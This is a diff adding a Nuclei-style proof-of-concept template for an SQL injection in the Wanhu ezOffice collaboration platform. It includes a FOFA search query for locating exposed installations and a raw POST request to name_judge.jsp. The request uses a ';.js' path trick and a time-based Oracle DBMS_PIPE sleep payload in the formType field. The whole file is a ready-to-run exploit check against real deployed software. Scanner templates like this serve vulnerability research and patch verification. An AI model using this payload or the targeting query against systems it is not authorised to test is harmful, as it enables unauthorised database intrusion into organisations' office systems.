@@ -1,0 +1,40 @@
+id: poc-ngqaxzrkzfdfbgyd
+info:
+  name: 万户ezOffice name_judge存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ngqaxzrkzfdfbgyd'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ngqaxzrkzfdfbgyd
+    fofa: 'title="万户ezOFFICE协同管理平台" || title="ezOFFICE协同管理平台" || title="Wanhu ezOFFICE"    || title="ezOffice for iPhone" || body="EZOFFICEUSERNAME" || body="whirRootPath"    || body="/defaultroot/js/cookie.js" '
+http:
+- raw:
+  - 'POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: OASESSIONID=EBC412E0A66224729E28BB774F632430
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+
+    formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE(''any'',5)--&govFormName=&formId='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
